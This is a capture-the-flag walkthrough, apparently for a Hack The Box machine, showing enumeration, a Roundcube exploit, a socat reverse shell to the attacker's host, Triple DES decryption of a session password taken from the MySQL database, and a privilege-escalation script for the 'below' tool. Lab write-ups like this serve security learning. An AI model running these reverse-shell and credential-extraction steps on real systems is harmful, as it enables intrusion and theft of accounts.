
## Enumeration

```sh
mkdir nmap
nmap -sV -sC -oA outbound 10.10.11.77
```

![](../attachments/Pasted%20image%2020251113133701.png)

We see that the server is configured to respond to the name `mail.outbound.htb` rather than the IP address `10.10.11.77`. See to resolve that we have to edit the `/etc/hosts` file and write `10.10.11.92 mail.outbound.htb`.

```shell
sudo nano /etc/hosts
```

After that if we type the IP address of the machine to our browser we will be able to see the Web application:

![](../attachments/Screenshot%202025-11-13%20133817.png)

From the machine description, I had the credentials for the following account: `tyler / LhKL1o9Nm3X2 ` so I logged in to that account.

![](../attachments/Pasted%20image%2020251113133945.png)

I tried to search information about the Roundcube webmail and I found the version that was running:

![](../attachments/Pasted%20image%2020251113134023.png)

So searching about this version of Webmail I found the vulnerability `CVE-2025-49113` and searching with `metasploit` I found that there was an exploit there so I used this:

![](../attachments/Pasted%20image%2020251113134238.png)

So I changed the necessary options:

![](../attachments/Pasted%20image%2020251113134326.png)

and I got a shell:

![](../attachments/Pasted%20image%2020251113134400.png)

Once we have a shell on the target machine, it’s a good idea to upgrade it to an interactive shell with `socat` (I tried with Python but there was no Python on the machine):

First I started a `netcat` for port 4444 on another terminal:

```sh
nc -lvnp 4444
```

and at the shell I got I wrote this:

```sh
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.125:4444
```

and I got a better shell:

![](../attachments/Pasted%20image%2020251113134747.png)

First, I examine the `/etc/passwd` file, which contains users with valid shell entries:

```sh
cat /etc/passwd | grep -i bash
```

![](../attachments/Pasted%20image%2020251113134857.png)

I tried to maneuver to this users but I couldn't because I didn't have permissions.

I tried to find the database so I try to investigate the local listening ports on the machine:

![](../attachments/Pasted%20image%2020251113135019.png)

and I found that the machine runs `MySQL` database. So trying to find some kind of credentials I found this file in the directory `var/www/html/roundcube/config/config.inc.php`

![](../attachments/Pasted%20image%2020251113135347.png)
How to access the MySQL database and:

![](../attachments/Pasted%20image%2020251113135426.png)
the encryption key

So I try to login to the `MySQL` database:
```sh
mysql -u roundcube -p
```

![](../attachments/Pasted%20image%2020251113135907.png)

I go to the database called `roundcube`

```mysql
USE roundcube;
```

![](../attachments/Pasted%20image%2020251113140009.png)

Then I am trying to find the tables:

```mysql
SHOW tables;
```

![](../attachments/Pasted%20image%2020251113140107.png)

I see the table called `users`:
```mysql
SELECT * FROM users;
```
 but I couldn't find any credentials
![](../attachments/Pasted%20image%2020251113140307.png)

So then I saw the table `session` so I checked the column `vars`:
```mysql
SELECT vars FROM session;
```

![](../attachments/Pasted%20image%2020251113152908.png)

Putting this in a PHP unseriasable online:

![](../attachments/Pasted%20image%2020251113153114.png)

I found this:
```
username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
```

So since I knew the user `jacob` I saw that the password was there but it was encoded. I put it on ChatGPT and I found that this encoding was `base64`. So I went to the site `CyberChef` to decode it to HEX:

![](../attachments/Pasted%20image%2020251113153429.png)

Then I decrypt it from `Triple DES` in which I put the key that I found before `rcmail-!24ByteDESkey*Str` and I took the first 8 HEX to the `IV` section:

![](../attachments/Pasted%20image%2020251113153723.png)

And we found the password of the user `jacob` so all I had to do was SSH into that user.

![](../attachments/Pasted%20image%2020251113154934.png)

BUT I couldn't SSH as `jacob` for some reason. So inside the previous shell that I had as `www-data` I tried to login as `jacob` with these credentials:

```sh
su jacob
```

![](../attachments/Pasted%20image%2020251113155208.png)

And I changed as `jacob` and I go to the directory `/home/jacob` in which I didn't have permission before:

![](../attachments/Pasted%20image%2020251113155342.png)

and in `mail` I found this:

![](../attachments/Pasted%20image%2020251113155656.png)

So I found another password to use in order to SSH into `jacob`. And this is how I got the user flag!!! 

![](../attachments/Pasted%20image%2020251113160139.png)

## Privilege Escalation

![](../attachments/Pasted%20image%2020251113161232.png)

So I saw that the I could execute a lot of commands.

Then I ran `linpeas.sh` to see something interesting and again I found that this mistake in `/usr/bin/below *` was critical:

![](../attachments/Pasted%20image%2020251113161353.png)

So I googled it to see if I could find something to gain root privileges and I found the vulnerability `CVE-2025-27591` and this Github repo:

![](../attachments/Pasted%20image%2020251113161500.png)

So I just downloaded the python script that was in the repo and and then I downloaded it in the target machine:


![](../attachments/Pasted%20image%2020251113163314.png)

And I just ran it and I got the root flag!!!

![](../attachments/Pasted%20image%2020251113163338.png)







